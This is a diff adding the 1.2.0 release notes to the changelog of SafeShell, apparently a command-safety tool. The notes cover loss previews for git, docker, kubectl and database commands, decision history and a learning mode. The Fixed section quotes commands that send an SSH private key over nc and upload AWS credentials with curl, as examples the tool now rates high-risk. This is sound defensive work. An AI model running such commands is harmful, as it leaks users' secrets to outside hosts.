@@ -2,6 +2,33 @@
 
 All notable changes to SafeShell. Versions follow [semantic versioning](https://semver.org/).
 
+## 1.2.0 - 2026-11-14
+
+Learn and see more: SafeShell now shows what a git, docker, kubectl or database command would lose before you approve it, explains commands as you work, and keeps a readable history of its decisions.
+
+### Added
+- Read-only previews in `analyze` and before you approve a risky command:
+  - git: the changed files and the commits no other branch still has that `reset --hard`, `checkout --`, `restore`, `clean -f`, `push --force`, `branch -D` and `stash drop/clear` would lose. Nothing is fetched and no repository hook or filter runs. (#26)
+  - docker and kubectl: the containers, images, networks, volumes and cluster objects that `docker rm`, `prune` and `kubectl delete` would remove. Volumes, namespaces and persistent volumes are rated R3. (#27)
+  - Databases: how many rows a `DELETE`, `UPDATE`, `DROP TABLE` or `TRUNCATE` in `psql -c`, `mysql -e` or `sqlite3 FILE` would touch, and how many keys a `redis-cli` delete would remove. Counting runs read-only and never sends your statement. A change to 1,000 rows or more is blocked unless you override. (#86)
+- `safeshell history [-n N] [--json]` shows what SafeShell decided, newest first. Thanks to @chiragjangiir. (#32)
+- Learning mode: `safeshell learn on` prints one line after each command that passes, saying what it does and the safer form. `safeshell help learn` explains it. (#25)
+- `safeshell deactivate` and `safeshell activate` turn checking off and on in every terminal at once, open ones included, with nothing to restart. `SAFESHELL_OFF=1` still pauses one terminal. `safeshell help pause` explains it.
+- `safeshell tour`: a one-minute walk-through (a read, a blocked `rm -rf`, a snapshot and an undo) in a throwaway folder. (#88)
+
+### Changed
+- `safeshell doctor` checks every part: the hook (installed, and active in this terminal), the daemon, snapshots, the AI and the cloud key state (never the key itself), and says when checking is paused. (#88)
+- JSON output: effects can have the new kind `database`.
+
+### Fixed
+- Sending secret files over the network (`cat ~/.ssh/id_rsa | nc host 80`, `curl -T ~/.aws/credentials`, ...) is rated R3 instead of R1. (#73)
+- Commands that run later are rated by what they will run: `alias`, `trap`, `PROMPT_COMMAND`, `crontab` and lines appended to `~/.bashrc` and other startup files. (#72)
+- A long `XDG_RUNTIME_DIR` no longer breaks the daemon with "bind: invalid argument". The socket path limit is now Linux's, and the message says which folder to use. Thanks to @Soham1660. (#123)
+- `/models` says when an environment variable such as `GEMINI_API_KEY` overrides the key you saved, instead of silently ignoring the saved one. Thanks to @Soham1660. (#126)
+
+### Contributors
+Welcome to two new contributors: @Soham1660 (#134, #135) and @chiragjangiir, who wrote `safeshell history` (#69).
+
 ## 1.1.1 - 2026-11-13
 
 A safety release: it closes the worst classifier and hook bypasses and hardens the sandbox, the daemon socket and printing.
